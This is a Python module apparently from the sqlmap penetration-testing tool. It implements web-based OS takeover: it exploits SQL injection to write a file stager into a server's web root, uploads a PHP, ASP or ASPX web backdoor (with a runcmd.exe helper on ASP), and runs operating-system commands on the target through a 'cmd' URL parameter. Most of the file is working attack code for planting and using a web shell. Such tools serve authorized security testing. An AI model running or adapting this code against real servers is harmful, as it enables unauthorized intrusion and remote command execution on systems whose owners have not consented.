#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import os
import posixpath
import re
import StringIO
import tempfile
import urlparse

from extra.cloak.cloak import decloak
from lib.core.agent import agent
from lib.core.common import arrayizeValue
from lib.core.common import Backend
from lib.core.common import extractRegexResult
from lib.core.common import getAutoDirectories
from lib.core.common import getManualDirectories
from lib.core.common import getPublicTypeMembers
from lib.core.common import getSQLSnippet
from lib.core.common import getUnicode
from lib.core.common import ntToPosixSlashes
from lib.core.common import isTechniqueAvailable
from lib.core.common import isWindowsDriveLetterPath
from lib.core.common import normalizePath
from lib.core.common import posixToNtSlashes
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import singleTimeWarnMessage
from lib.core.convert import hexencode
from lib.core.convert import utf8encode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.enums import PAYLOAD
from lib.core.enums import WEB_API
from lib.core.exception import SqlmapNoneDataException
from lib.core.settings import BACKDOOR_RUN_CMD_TIMEOUT
from lib.core.settings import EVENTVALIDATION_REGEX
from lib.core.settings import VIEWSTATE_REGEX
from lib.request.connect import Connect as Request
from thirdparty.oset.pyoset import oset


class Web:
    """
    This class defines web-oriented OS takeover functionalities for
    plugins.
    """

    def __init__(self):
        self.webApi = None
        self.webBaseUrl = None
        self.webBackdoorUrl = None
        self.webBackdoorFilePath = None
        self.webStagerUrl = None
        self.webStagerFilePath = None
        self.webDirectory = None

    def webBackdoorRunCmd(self, cmd):
        if self.webBackdoorUrl is None:
            return

        output = None

        if not cmd:
            cmd = conf.osCmd

        cmdUrl = "%s?cmd=%s" % (self.webBackdoorUrl, cmd)
        page, _, _ = Request.getPage(url=cmdUrl, direct=True, silent=True, timeout=BACKDOOR_RUN_CMD_TIMEOUT)

        if page is not None:
            output = re.search("<pre>(.+?)</pre>", page, re.I | re.S)

            if output:
                output = output.group(1)

        return output

    def webUpload(self, destFileName, directory, stream=None, content=None, filepath=None):
        if filepath is not None:
            if filepath.endswith('_'):
                content = decloak(filepath)  # cloaked file
            else:
                with open(filepath, "rb") as f:
                    content = f.read()

        if content is not None:
            stream = StringIO.StringIO(content)  # string content

        return self._webFileStreamUpload(stream, destFileName, directory)

    def _webFileStreamUpload(self, stream, destFileName, directory):
        stream.seek(0)  # Rewind

        try:
            setattr(stream, "name", destFileName)
        except TypeError:
            pass

        if self.webApi in getPublicTypeMembers(WEB_API, True):
            multipartParams = {
                                "upload":    "1",
                                "file":      stream,
                                "uploadDir": directory,
                              }

            if self.webApi == WEB_API.ASPX:
                multipartParams['__EVENTVALIDATION'] = kb.data.__EVENTVALIDATION
                multipartParams['__VIEWSTATE'] = kb.data.__VIEWSTATE

            page, _, _ = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)

            if "File uploaded" not in page:
                warnMsg = "unable to upload the file through the web file "
                warnMsg += "stager to '%s'" % directory
                logger.warn(warnMsg)
                return False
            else:
                return True
        else:
            logger.error("sqlmap hasn't got a web backdoor nor a web file stager for %s" % self.webApi)
            return False

    def _webFileInject(self, fileContent, fileName, directory):
        outFile = posixpath.join(ntToPosixSlashes(directory), fileName)
        uplQuery = getUnicode(fileContent).replace("WRITABLE_DIR", directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory)
        query = ""

        if isTechniqueAvailable(kb.technique):
            where = kb.injection.data[kb.technique].where

            if where == PAYLOAD.WHERE.NEGATIVE:
                randInt = randomInt()
                query += "OR %d=%d " % (randInt, randInt)

        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=hexencode(uplQuery))
        query = agent.prefixQuery(query)
        query = agent.suffixQuery(query)
        payload = agent.payload(newValue=query)
        page = Request.queryPage(payload)

        return page

    def webInit(self):
        """
        This method is used to write a web backdoor (agent) on a writable
        remote directory within the web server document root.
        """

        if self.webBackdoorUrl is not None and self.webStagerUrl is not None and self.webApi is not None:
            return

        self.checkDbmsOs()

        default = None
        choices = list(getPublicTypeMembers(WEB_API, True))

        for ext in choices:
            if conf.url.endswith(ext):
                default = ext
                break

        if not default:
            default = WEB_API.ASP if Backend.isOs(OS.WINDOWS) else WEB_API.PHP

        message = "which web application language does the web server "
        message += "support?\n"

        for count in xrange(len(choices)):
            ext = choices[count]
            message += "[%d] %s%s\n" % (count + 1, ext.upper(), (" (default)" if default == ext else ""))

            if default == ext:
                default = count + 1

        message = message[:-1]

        while True:
            choice = readInput(message, default=str(default))

            if not choice.isdigit():
                logger.warn("invalid value, only digits are allowed")

            elif int(choice) < 1 or int(choice) > len(choices):
                logger.warn("invalid value, it must be between 1 and %d" % len(choices))

            else:
                self.webApi = choices[int(choice) - 1]
                break

        directories = list(arrayizeValue(getManualDirectories()))
        directories.extend(getAutoDirectories())
        directories = list(oset(directories))

        path = urlparse.urlparse(conf.url).path or '/'
        if path != '/':
            _ = []
            for directory in directories:
                _.append(directory)
                if not directory.endswith(path):
                    _.append("%s/%s" % (directory.rstrip('/'), path.strip('/')))
            directories = _

        backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webApi)
        backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi))

        stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))

        for directory in directories:
            if not directory:
                continue

            stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
            self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)

            uploaded = False
            directory = ntToPosixSlashes(normalizePath(directory))

            if not isWindowsDriveLetterPath(directory) and not directory.startswith('/'):
                directory = "/%s" % directory

            if not directory.endswith('/'):
                directory += '/'

            # Upload the file stager with the LIMIT 0, 1 INTO DUMPFILE method
            infoMsg = "trying to upload the file stager on '%s' " % directory
            infoMsg += "via LIMIT 'LINES TERMINATED BY' method"
            logger.info(infoMsg)
            self._webFileInject(stagerContent, stagerName, directory)

            for match in re.finditer('/', directory):
                self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
                self.webStagerUrl = urlparse.urljoin(self.webBaseUrl, stagerName)
                debugMsg = "trying to see if the file is accessible from '%s'" % self.webStagerUrl
                logger.debug(debugMsg)

                uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
                uplPage = uplPage or ""

                if "sqlmap file uploader" in uplPage:
                    uploaded = True
                    break

            # Fall-back to UNION queries file upload method
            if not uploaded:
                warnMsg = "unable to upload the file stager "
                warnMsg += "on '%s'" % directory
                singleTimeWarnMessage(warnMsg)

                if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
                    infoMsg = "trying to upload the file stager on '%s' " % directory
                    infoMsg += "via UNION method"
                    logger.info(infoMsg)

                    stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
                    self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)

                    handle, filename = tempfile.mkstemp()
                    os.close(handle)

                    with open(filename, "w+b") as f:
                        _ = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))
                        _ = _.replace("WRITABLE_DIR", utf8encode(directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory))
                        f.write(_)

                    self.unionWriteFile(filename, self.webStagerFilePath, "text", forceCheck=True)

                    for match in re.finditer('/', directory):
                        self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
                        self.webStagerUrl = urlparse.urljoin(self.webBaseUrl, stagerName)

                        debugMsg = "trying to see if the file is accessible from '%s'" % self.webStagerUrl
                        logger.debug(debugMsg)

                        uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
                        uplPage = uplPage or ""

                        if "sqlmap file uploader" in uplPage:
                            uploaded = True
                            break

            if not uploaded:
                continue

            if "<%" in uplPage or "<?" in uplPage:
                warnMsg = "file stager uploaded on '%s', " % directory
                warnMsg += "but not dynamically interpreted"
                logger.warn(warnMsg)
                continue

            elif self.webApi == WEB_API.ASPX:
                kb.data.__EVENTVALIDATION = extractRegexResult(EVENTVALIDATION_REGEX, uplPage)
                kb.data.__VIEWSTATE = extractRegexResult(VIEWSTATE_REGEX, uplPage)

            infoMsg = "the file stager has been successfully uploaded "
            infoMsg += "on '%s' - %s" % (directory, self.webStagerUrl)
            logger.info(infoMsg)

            if self.webApi == WEB_API.ASP:
                match = re.search(r'input type=hidden name=scriptsdir value="([^"]+)"', uplPage)

                if match:
                    backdoorDirectory = match.group(1)
                else:
                    continue

                _ = "tmpe%s.exe" % randomStr(lowercase=True)
                if self.webUpload(backdoorName, backdoorDirectory, content=backdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", _)):
                    self.webUpload(_, backdoorDirectory, filepath=os.path.join(paths.SQLMAP_SHELL_PATH, 'runcmd.exe_'))
                    self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl, backdoorName)
                    self.webDirectory = backdoorDirectory
                else:
                    continue

            else:
                if not self.webUpload(backdoorName, posixToNtSlashes(directory) if Backend.isOs(OS.WINDOWS) else directory, content=backdoorContent):
                    warnMsg = "backdoor has not been successfully uploaded "
                    warnMsg += "through the file stager possibly because "
                    warnMsg += "the user running the web server process "
                    warnMsg += "has not write privileges over the folder "
                    warnMsg += "where the user running the DBMS process "
                    warnMsg += "was able to upload the file stager or "
                    warnMsg += "because the DBMS and web server sit on "
                    warnMsg += "different servers"
                    logger.warn(warnMsg)

                    message = "do you want to try the same method used "
                    message += "for the file stager? [Y/n] "
                    getOutput = readInput(message, default="Y")

                    if getOutput in ("y", "Y"):
                        self._webFileInject(backdoorContent, backdoorName, directory)
                    else:
                        continue

                self.webBackdoorUrl = posixpath.join(ntToPosixSlashes(self.webBaseUrl), backdoorName)
                self.webDirectory = directory

            self.webBackdoorFilePath = posixpath.join(ntToPosixSlashes(directory), backdoorName)

            testStr = "command execution test"
            output = self.webBackdoorRunCmd("echo %s" % testStr)

            if output == "0":
                warnMsg = "the backdoor has been uploaded but required privileges "
                warnMsg += "for running the system commands are missing"
                raise SqlmapNoneDataException(warnMsg)
            elif output and testStr in output:
                infoMsg = "the backdoor has been successfully "
            else:
                infoMsg = "the backdoor has probably been successfully "

            infoMsg += "uploaded on '%s' - " % self.webDirectory
            infoMsg += self.webBackdoorUrl
            logger.info(infoMsg)

            break
